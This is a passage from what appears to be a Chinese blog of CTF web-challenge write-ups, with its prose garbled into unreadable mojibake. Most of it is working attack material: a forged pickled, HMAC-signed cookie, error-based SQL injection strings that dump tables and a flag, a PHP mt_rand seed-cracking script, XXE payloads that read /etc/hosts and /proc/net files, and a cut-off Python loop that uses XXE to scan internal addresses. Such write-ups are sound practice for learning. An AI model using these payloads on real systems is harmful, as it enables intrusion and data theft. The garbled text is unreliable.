<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pickle</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">hmac</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">key</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;66666666666666666666666666666666&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">cookies</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;money&#34;</span><span class="p">:</span><span class="mi">10000</span><span class="p">,</span><span class="s2">&#34;history&#34;</span><span class="p">:[]}</span>
</span></span><span class="line"><span class="cl"><span class="n">h</span> <span class="o">=</span> <span class="n">hmac</span><span class="o">.</span><span class="n">new</span><span class="p">(</span><span class="n">key</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">h</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span>
</span></span><span class="line"><span class="cl"><span class="n">cookies</span><span class="p">[</span><span class="s2">&#34;anti_tamper_hmac&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">h</span><span class="o">.</span><span class="n">digest</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">result2</span> <span class="o">=</span> <span class="n">pickle</span><span class="o">.</span><span class="n">dumps</span><span class="p">(</span><span class="n">cookies</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">result2</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡ŒæŠŠä½™é¢è®¾ç½®ä¸º10000ï¼Œå¹¶ç”¨æˆ‘ä»¬è‡ªå·±çš„keyæ¥ç»™cookieåšç­¾åï¼Œå¾—åˆ°çš„pickleæµï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">b&#34;\x80\x03}q\x00(X\x05\x00\x00\x00moneyq\x01M\x10&#39;X\x07\x00\x00\x00historyq\x02]q\x03X\x10\x00\x00\x00anti_tamper_hmacq\x04X \x00\x00\x00ccb487eec1cb66dda8d00a8121aeb4bfq\x05u.&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="rctf2015easysql">[RCTF2015]EasySQL
</h2><p>å‘ç°æœ‰äºŒæ¬¡æ³¨å…¥ï¼Œåœ¨ä¿®æ”¹å¯†ç æ—¶è§¦å‘</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)=database()),0x7e))#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250228000627331.png"
	width="471"
	height="64"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250228000627331_hu9611470971424810564.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250228000627331_hu16260475436898226828.png 1024w"
	loading="lazy"
	
		alt="image-20250228000627331"
	
	
		class="gallery-image" 
		data-flex-grow="735"
		data-flex-basis="1766px"
	
></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#39;flag&#39;)))#
</span></span><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,(select(flag)from(flag))))#
</span></span></code></pre></td></tr></table>
</div>
</div><p>å‡flag</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#39;users&#39;)))#
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250228000812345.png"
	width="609"
	height="60"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250228000812345_hu17351778386634832415.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250228000812345_hu17158385183544697014.png 1024w"
	loading="lazy"
	
		alt="image-20250228000812345"
	
	
		class="gallery-image" 
		data-flex-grow="1015"
		data-flex-basis="2436px"
	
></p>
<p>æ²¡å›æ˜¾å®Œå…¨ï¼Œä½†æ˜¯mid,left,right,substréƒ½è¢«è¿‡æ»¤äº†</p>
<p>è¿™é‡Œç”¨åˆ°æ­£åˆ™åŒ¹é…<code>regexp('^f')</code>ï¼šæŸ¥æ‰¾å¼€å¤´fçš„å­—ç¬¦ä¸²</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">1&#34;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#39;users&#39;)&amp;&amp;(column_name)regexp(&#39;^r&#39;))))#
</span></span><span class="line"><span class="cl">æˆ–è€…reverseå‡½æ•°å€’è½¬
</span></span><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,reverse((select(group_concat(column_name))from(information_schema.columns)where(table_name)=&#39;users&#39;))))#
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,(select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;))))#
</span></span></code></pre></td></tr></table>
</div>
</div><p>extractvalueæœ€å¤šåªèƒ½æ˜¾ç¤º32ä½çš„åŸå› ï¼ŒæŠ¥é”™å›æ˜¾ä¸èƒ½å¤Ÿå®Œå…¨æ˜¾ç¤ºflagçš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥ä¾ç„¶ä½¿ç”¨ reverse()å‡½æ•°ï¼Œå°†flagå€¼å€’ç½®è¾“å‡ºï¼Œå†åˆ©ç”¨sqlè¯­å¥å°†å€’ç½®éƒ¨åˆ†æ¢å¤ï¼Œå°†å‰åä¸¤éƒ¨åˆ†flagæ‹¼æ¥åˆ°ä¸€èµ·ï¼Œå°±å¯ä»¥è·å¾—å®Œæ•´çš„flagå€¼ã€‚</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin&#34;||extractvalue(1,concat(0x7e,reverse((select(real_flag_1s_here)from(users)where(real_flag_1s_here)regexp(&#39;^f&#39;)))))#
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">a</span><span class="o">=</span><span class="s1">&#39;}ca0da771c04c-e69b-dab4-3f8f-e3&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">b</span><span class="o">=</span><span class="n">a</span><span class="p">[::</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">b</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="gwctf-2019æ¯ç‡¥çš„æŠ½å¥–">[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–
</h2><p>æŸ¥çœ‹æºç æœ‰ä¸ªcheck.php</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"> <span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="c1">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">header</span><span class="p">(</span><span class="s2">&#34;Content-Type: text/html;charset=utf-8&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">session_start</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="o">!</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;seed&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl"><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;seed&#39;</span><span class="p">]</span><span class="o">=</span><span class="nx">rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="mi">999999999</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;seed&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl"><span class="nv">$str_long1</span> <span class="o">=</span> <span class="s2">&#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$str</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$len1</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$str</span><span class="o">.=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$str_long1</span><span class="p">,</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$str_long1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>       
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nv">$str_show</span> <span class="o">=</span> <span class="nx">substr</span><span class="p">(</span><span class="nv">$str</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">10</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="s2">&#34;&lt;p id=&#39;p1&#39;&gt;&#34;</span><span class="o">.</span><span class="nv">$str_show</span><span class="o">.</span><span class="s2">&#34;&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">])){</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;num&#39;</span><span class="p">]</span><span class="o">===</span><span class="nv">$str</span><span class="p">){</span><span class="nx">x</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag{xxxxxxxxx}&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">echo</span> <span class="s2">&#34;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="s2">&#34;check.php&#34;</span><span class="p">);</span> 
</span></span></code></pre></td></tr></table>
</div>
</div><p>åˆ©ç”¨mt_randå‡½æ•°çš„ä¼ªéšæœºæ•°æ¼æ´</p>
<p>å…ˆå¾—åˆ°ç§å­,ç”¨php_mt_seedå·¥å…·çˆ†ç§å­</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">str1</span><span class="o">=</span><span class="s1">&#39;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">str2</span><span class="o">=</span><span class="s1">&#39;fnAeH65lyg&#39;</span>
</span></span><span class="line"><span class="cl"><span class="n">res</span><span class="o">=</span><span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str2</span><span class="p">)):</span>  
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str1</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">str2</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">==</span> <span class="n">str1</span><span class="p">[</span><span class="n">j</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">            <span class="n">res</span><span class="o">+=</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="n">j</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="s1">&#39;0&#39;</span><span class="o">+</span><span class="s1">&#39; &#39;</span><span class="o">+</span><span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">str1</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span><span class="o">+</span><span class="s1">&#39; &#39;</span>
</span></span><span class="line"><span class="cl">            <span class="k">break</span>
</span></span><span class="line"><span class="cl"><span class="nb">print</span><span class="p">(</span><span class="n">res</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">mt_srand</span><span class="p">(</span><span class="mi">206304701</span><span class="p">);</span> 
</span></span><span class="line"><span class="cl"><span class="nv">$str_long1</span> <span class="o">=</span> <span class="s2">&#34;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$str</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$len1</span><span class="o">=</span><span class="mi">20</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span> <span class="nv">$i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$len1</span><span class="p">;</span> <span class="nv">$i</span><span class="o">++</span> <span class="p">){</span>
</span></span><span class="line"><span class="cl">    <span class="nv">$str</span><span class="o">.=</span><span class="nx">substr</span><span class="p">(</span><span class="nv">$str_long1</span><span class="p">,</span> <span class="nx">mt_rand</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nx">strlen</span><span class="p">(</span><span class="nv">$str_long1</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">1</span><span class="p">);</span>       
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="k">echo</span> <span class="nv">$str</span><span class="p">;</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="nctf2019true-xml-cookbook">[NCTF2019]True XML cookbook
</h2><p>xxeæ³¨å…¥ï¼Œä½†æ˜¯è·Ÿè¿™ä¸ªæ¯”èµ›ä¹‹å‰çš„ä¸ä¸€æ ·ï¼Œä¸èƒ½ç›´æ¥è¯»flagäº†</p>
<p>è¿™é¢˜éœ€è¦å¯¹å†…ç½‘çš„ä¸»æœºè¿›è¡Œæ¢æµ‹,æˆ‘ä»¬åˆ†åˆ«è¯»å–å…³é”®æ–‡ä»¶ï¼š<strong>/etc/hosts å’Œ /proc/net/arpï¼š</strong></p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE a [
</span></span><span class="line"><span class="cl"> &lt;!ENTITY abc SYSTEM &#34;file:///etc/hosts&#34;&gt;
</span></span><span class="line"><span class="cl"> ]&gt;
</span></span><span class="line"><span class="cl">&lt;user&gt;&lt;username&gt;&amp;abc;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE a [
</span></span><span class="line"><span class="cl"> &lt;!ENTITY abc SYSTEM &#34;file:///proc/net/arp&#34;&gt;
</span></span><span class="line"><span class="cl"> ]&gt;
</span></span><span class="line"><span class="cl">&lt;user&gt;&lt;username&gt;&amp;abc;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301165632829.png"
	width="1893"
	height="778"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301165632829_hu16466583103963956935.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250301165632829_hu7030111360843140188.png 1024w"
	loading="lazy"
	
		alt="image-20250301165632829"
	
	
		class="gallery-image" 
		data-flex-grow="243"
		data-flex-basis="583px"
	
></p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301165654650.png"
	width="1856"
	height="764"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301165654650_hu7382025799349749608.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250301165654650_hu16733016153482679883.png 1024w"
	loading="lazy"
	
		alt="image-20250301165654650"
	
	
		class="gallery-image" 
		data-flex-grow="242"
		data-flex-basis="583px"
	
></p>
<p>æ‰¾åˆ°ip169.254.1.1</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE a [
</span></span><span class="line"><span class="cl"> &lt;!ENTITY abc SYSTEM &#34;http://169.254.1.1&#34;&gt;
</span></span><span class="line"><span class="cl"> ]&gt;
</span></span><span class="line"><span class="cl">&lt;user&gt;&lt;username&gt;&amp;abc;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p>intruderçˆ†ç ´cæ®µï¼Œå°±æ˜¯ipæ•°å­—æœ€åä¸€ä¸ª</p>
<p>ä¸å¯¹ï¼Œè¯»å–/proc/net/fib_trieæ–‡ä»¶</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
</span></span><span class="line"><span class="cl">&lt;!DOCTYPE a [
</span></span><span class="line"><span class="cl"> &lt;!ENTITY abc SYSTEM &#34;file:///proc/net/fib_trie&#34;&gt;
</span></span><span class="line"><span class="cl"> ]&gt;
</span></span><span class="line"><span class="cl">&lt;user&gt;&lt;username&gt;&amp;abc;&lt;/username&gt;&lt;password&gt;123456&lt;/password&gt;&lt;/user&gt;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301170301809.png"
	width="1882"
	height="843"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301170301809_hu17038029730314924421.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250301170301809_hu5251376535239653425.png 1024w"
	loading="lazy"
	
		alt="image-20250301170301809"
	
	
		class="gallery-image" 
		data-flex-grow="223"
		data-flex-basis="535px"
	
></p>
<p>å¾—åˆ°10.244.166.66</p>
<p>å†æ¬¡çˆ†ç ´ï¼Œè¿™é‡Œçš„çˆ†ç ´å»¶æ—¶è¦è®¾ç½®</p>
<p><img src="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301171129435.png"
	width="541"
	height="269"
	srcset="/p/buuctf%E5%88%B7%E9%A2%98/image-20250301171129435_hu4137146849321971466.png 480w, /p/buuctf%E5%88%B7%E9%A2%98/image-20250301171129435_hu4929811822535333215.png 1024w"
	loading="lazy"
	
		alt="image-20250301171129435"
	
	
		class="gallery-image" 
		data-flex-grow="201"
		data-flex-basis="482px"
	
></p>
<p>çˆ†å‡ºæ¥é•¿åº¦æ­£å¸¸çš„å°±æ˜¯flag</p>
<p>æˆ–è€…ç”¨è„šæœ¬çˆ†</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">requests</span> <span class="k">as</span> <span class="nn">res</span>
</span></span><span class="line"><span class="cl"><span class="n">url</span><span class="o">=</span><span class="s2">&#34;http://a1fb5d9d-ab10-442b-9323-727c25c3fcb6.node5.buuoj.cn:81/doLogin.php&#34;</span>
</span></span><span class="line"><span class="cl"><span class="n">rawPayload</span><span class="o">=</span><span class="s1">&#39;&lt;?xml version=&#34;1.0&#34;?&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;!DOCTYPE user [&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;!ENTITY payload1 SYSTEM &#34;http://10.244.166.</span><span class="si">{}</span><span class="s1">&#34;&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;]&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;user&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;username&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&amp;payload1;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;/username&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;password&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;23&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;/password&gt;&#39;</span>\
</span></span><span class="line"><span class="cl">         <span class="s1">&#39;&lt;/user&gt;&#39;</span>
</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">256</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">payload</span><span class="o">=</span><span class="n">rawPayload</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1">#payload=rawPayload</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="s2">&#34;#</span><span class="si">{}</span><span class="s2"> =&gt;&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">),</span><span class="n">end</span><span class="o">=</span><span class="s1">&#39;&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
